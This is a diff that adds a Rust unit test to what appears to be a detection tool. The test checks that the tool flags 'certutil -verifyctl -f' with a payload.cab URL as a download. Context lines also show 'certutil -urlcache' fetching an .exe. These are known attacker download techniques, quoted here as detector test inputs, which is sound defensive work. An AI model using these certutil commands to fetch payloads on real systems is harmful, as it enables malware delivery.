@@ -11245,6 +11245,26 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_verifyctl_emits_download_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -verifyctl -f https://certutil-verifyctl.example/payload.cab out.cab",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl.example/payload.cab" && dst == "out.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil -verifyctl download was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_skips_slash_flag_after_url() {
         let mut env = Environment::new(&Config::default());
         interpret_line("certutil -urlcache http://x/y.exe /f out.exe", &mut env);
